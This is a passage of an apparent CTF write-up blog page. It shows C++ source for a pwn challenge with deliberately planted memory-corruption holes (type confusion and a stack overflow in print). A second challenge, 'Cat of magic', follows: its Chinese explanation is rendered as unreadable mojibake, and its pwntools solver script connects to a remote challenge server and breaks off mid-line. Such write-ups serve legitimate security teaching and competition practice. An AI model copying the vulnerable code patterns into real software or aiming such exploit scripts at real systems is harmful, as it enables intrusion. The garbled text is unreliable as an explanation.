â–’â–ˆâ–ˆâ–€â–€â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ  â–€â–ˆâ–„  â–’â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–’â–“â–“â–„ â–„â–ˆâ–ˆâ–’â–‘â–“â–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆ â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–’ â–“â–ˆâ–ˆâ–ˆâ–€ â–‘â–‘â–“â–ˆâ–’â–‘â–ˆâ–ˆâ–“ â–“â–ˆ   â–“â–ˆâ–ˆâ–’â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–‘ â–‘â–’ â–’  â–‘ â–’ â–‘â–‘â–’â–‘â–’ â–’â–’   â–“â–’â–ˆâ–‘â–‘ â–’â–‘â–’â–‘â–’â–‘ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  â–‘  â–’    â–’ â–‘â–’â–‘ â–‘  â–’   â–’â–’ â–‘  â–‘ â–’ â–’â–‘ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–‘         â–‘  â–‘â–‘ â–‘  â–‘   â–’   â–‘ â–‘ â–‘ â–’  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–‘ â–‘       â–‘  â–‘  â–‘      â–‘  â–‘    â–‘ â–‘  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–‘                                   &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  welcome();</span><br><span class="line">  alarm(<span class="number">0x20</span>);</span><br><span class="line">  filter();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_one</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">  <span class="type">void</span> *data;</span><br><span class="line">  </span><br><span class="line">  Class_one() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  Class_one(<span class="type">char</span>* buf)</span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    this-&gt;data = strdup(buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Class_one()</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(this-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">char</span> *<span class="title function_">c_str</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span>*)data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">char</span>* buf)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(this-&gt;data);</span><br><span class="line">    this-&gt;data = strdup(buf);</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = size() + <span class="number">10</span>;</span><br><span class="line">    <span class="type">char</span> buf[this-&gt;length];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buf, c_str());</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buf) &gt; (this-&gt;length - <span class="number">1</span>)) throw <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_kun</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span>* buf;</span><br><span class="line"></span><br><span class="line">  Class_kun(<span class="type">int</span> size, <span class="type">char</span>* buf)</span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;size = size;</span><br><span class="line">    this-&gt;buf = strdup(buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~Class_kun()</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(this-&gt;buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_two</span> :</span> public Class_one</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">  Class_two(<span class="type">char</span>* buf)</span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    this-&gt;data = new Class_kun(this-&gt;length, buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~Class_two()</span><br><span class="line">  &#123;</span><br><span class="line">    delete((Class_kun*)this-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *<span class="title function_">c_str</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> ((Class_kun*)this-&gt;data)-&gt;buf;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> ((Class_kun*)this-&gt;data)-&gt;size;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">char</span>* buf)</span></span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    ((Class_kun*)this-&gt;data)-&gt;buf = strdup(buf);</span><br><span class="line">    ((Class_kun*)this-&gt;data)-&gt;size = this-&gt;length;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cnt;</span><br><span class="line">Class_one *lst[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|******************|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|       MENU       |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    1. Create     |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    2. Update     |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    3. Display    |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    4. Exit       |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|******************|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input your choice &gt;&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (cnt &gt;= <span class="number">10</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No spare space.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Which type do you want to create?&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; type;</span><br><span class="line">  <span class="keyword">if</span> ((type != <span class="number">0</span>) &amp;&amp; (type != <span class="number">1</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No such type.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">string</span> content;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the content &gt;&gt; &quot;</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; content;</span><br><span class="line">  <span class="keyword">if</span> (content.size() &gt;= <span class="number">0x100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] Content is too long.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    lst[cnt] = new Class_two((<span class="type">char</span>*)content.c_str());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    lst[cnt] = new Class_one((<span class="type">char</span>*)content.c_str());</span><br><span class="line">  &#125;</span><br><span class="line">  cnt++;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Success] Created!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Which one do you want to update?&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; idx;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (idx &gt;= cnt)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No such one.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">string</span> content;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the new content &gt;&gt; &quot;</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; content;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (content.size() &gt;= <span class="number">0x100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] Content is too long.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  lst[idx]-&gt;update((<span class="type">char</span>*) content.c_str());</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Success] Updated!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Which one do you want to display?&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; idx;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (idx &gt;= cnt)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No such one.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  lst[idx]-&gt;print();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> choice;</span><br><span class="line">  </span><br><span class="line">  try</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      <span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line">      <span class="keyword">switch</span>(choice)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        update();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        display();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye~&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] Invild choice.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  catch(<span class="type">int</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Cat-of-magicğŸ§™â€â™€ï¸"><a href="#Cat-of-magicğŸ§™â€â™€ï¸" class="headerlink" title="Cat of magicğŸ§™â€â™€ï¸"></a>Cat of magicğŸ§™â€â™€ï¸</h3><p>made by xiaoji233</p>
<p>æ ¹æ®é¢˜æ„ï¼Œæ˜¯ä¸€ä¸ª 20*20 çš„è¿·å®«ï¼Œç„¶åæœ‰10å±‚ã€‚æ ¹æ®æ‰€ç»™æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°è¦æ•‘å‡º100æ¬¡çŒ«ï¼Œåœ¨ç¬¬ä¸€å±‚ä¸‹æ¥¼ä¹‹åå°±ä¼šå¾—åˆ° flagã€‚çŒ«åº”è¯¥æ˜¯åœ¨ç¬¬ 10 å±‚çš„ 18ï¼Œ18 çš„ä½ç½®ã€‚</p>
<p>é€šè¿‡ dfs ç®—æ³•æŠŠè¿·å®«æ ·è²Œè·‘å‡ºæ¥ï¼Œç„¶åæ‰‹èµ°ï¼Œèµ°åˆ°ç¬¬10å±‚ä¹‹åå‘ç° 18ï¼Œ18 çš„ä½ç½®ä¸­è¢«å¢™å£å°é”äº†ã€‚ä½†æ˜¯ç»™äº†ä¸ªé”¤å­ï¼Œåº”è¯¥æ˜¯è¦ç”¨é”¤å­ç ¸å¢™å£ç„¶åæ•‘åˆ°çŒ«ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½è¦èµ°åˆ°ç¬¬ä¸€å±‚ï¼Œæ—¶é—´ä¸Šæ¥ä¸å¤ªå¤Ÿã€‚äºæ˜¯è€ƒè™‘å…¶å®ƒæ–¹æ³•ï¼Œè§‚å¯Ÿåˆ°å…¨å±€å˜é‡ä¸­æœ‰ RescueCat å˜é‡ï¼Œå¹¶ä¸”æœ€ååˆ¤æ–­çš„æ—¶å€™åªéœ€è¦åˆ¤æ–­æ•‘å‡ºçš„çŒ«æ˜¯å¦ &gt;&#x3D;100 å³å¯ï¼Œå¹¶ä¸”ç§»åŠ¨é€‰æ‹©å™¨çš„ç®—æ³•ä¸­ï¼Œåœ¨å¤„ç†çš„æ—¶å€™ä¼šå¼ºåˆ¶æŠŠå½“å‰ä½ç½®å˜æˆâ€™.â€™ï¼Œå› æ­¤æ‹¿äº†é”¤å­ç›´æ¥åœ¨ç¬¬ä¸€å±‚å¼€å§‹ç ¸å¢™ï¼Œå‘ä¸Šè¿›è¡Œå˜é‡è¦†ç›–ï¼Œè¦†ç›–ä»»æ„ä¸€ä¸ªå­—èŠ‚æˆ–ä¸¤ä¸ªå­—èŠ‚åˆ° RescueCat å˜é‡ä¸­å†ä»ç¬¬ä¸€å±‚èµ°å‡ºå³å¯æ‹¿åˆ° flagã€‚</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>dfsçš„pythonè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;101.43.78.225&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">maze=[]</span><br><span class="line">IsGo=[]</span><br><span class="line">doorkey=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">dx=[<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">dy=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,-<span class="number">1</span>]</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line">y=<span class="number">1</span></span><br><span class="line">key=<span class="string">&#x27;DASW&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">InitMaze</span>():</span><br><span class="line">    <span class="keyword">global</span> maze,IsGo</span><br><span class="line">    maze = []</span><br><span class="line">    IsGo = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        s=[<span class="string">&#x27;#&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">        maze.append(s)</span><br><span class="line">        k=[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">        IsGo.append(k)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(Y/N)&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>():</span><br><span class="line">    s=p.recvuntil(<span class="string">b&#x27;Now you see:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;can&#x27;t&quot;</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_maze</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">global</span> maze,x,y,flag</span><br><span class="line">    res=judge()</span><br><span class="line">    <span class="built_in">print</span>(res,x,y)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        x += dx[k]</span><br><span class="line">        y += dy[k]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        s = p.recvline().decode()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span>(maze[y+i-<span class="number">1</span>][x+j-<span class="number">1</span>]==<span class="string">&#x27;#&#x27;</span> <span class="keyword">or</span> maze[y+i-<span class="number">1</span>][x+j-<span class="number">1</span>]==<span class="string">&#x27;@&#x27;</span> <span class="keyword">or</span> flag):maze[y+i-<span class="number">1</span>][x+j-<span class="number">1</span>]=s[j]</span><br><span class="line">    <span class="keyword">if</span> x==<span class="number">3</span> <span class="keyword">and</span> y==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(res, x, y)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PrintMaze</span>():</span><br><span class="line">    <span class="comment">#os.system(&quot;cls&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            <span class="keyword">if</span> i==y <span class="keyword">and</span> j==x:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;@&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(maze[i][j],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params"><span class="built_in">dir</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">dir</span>)!=<span class="number">1</span>:<span class="keyword">return</span></span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">dir</span>.upper()</span><br><span class="line">    k = key.find(<span class="built_in">dir</span>)</span><br><span class="line">    <span class="keyword">if</span>(k==-<span class="number">1</span>):<span class="keyword">return</span></span><br><span class="line">    p.sendline(<span class="built_in">dir</span>)</span><br><span class="line">    res=get_maze(k)</span><br><span class="line">    PrintMaze()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">line=<span class="string">&#x27;ssDdww&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>():</span><br><span class="line">    dot=[]</span><br><span class="line">    door=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        nx=x+dx[i]</span><br><span class="line">        ny=y+dy[i]</span><br><span class="line">        <span class="keyword">if</span> IsGo[ny][nx]==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> maze[ny][nx]==<span class="string">&#x27;.&#x27;</span> <span class="keyword">or</span> maze[ny][nx]&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> maze[ny][nx]&lt;=<span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">                dot.append(i)</span><br><span class="line">            <span class="keyword">elif</span> maze[ny][nx]&gt;=<span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> maze[ny][nx]&lt;=<span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">                door.append(i)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> dot:</span><br><span class="line">        nx = x + dx[k]</span><br><span class="line">        ny = y + dy[k]</span><br><span class="line">        <span class="keyword">if</span> maze[ny][nx]&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> maze[ny][nx] &lt;=<span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            doorkey[<span class="built_in">ord</span>(maze[ny][nx]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)]+=<span class="number">1</span></span><br><span class="line">        IsGo[y][x] = <span class="number">1</span></span><br><span class="line">        move(key[k])</span><br><span class="line">        dfs()</span><br><span class="line">        move(key[k^<span class="number">1</span>])</span><br><span class="line">        IsGo[y][x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> door:</span><br><span class="line">        nx = x + dx[k]</span><br><span class="line">        ny = y + dy[k]</span><br><span class="line">        <span class="keyword">if</span> doorkey[<span class="built_in">ord</span>(maze[ny][nx])-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)]:</span><br><span class="line">            doorkey[<span class="built_in">ord</span>(maze[ny][nx])-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)]-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        IsGo[y][x] = <span class="number">1</span></span><br><span 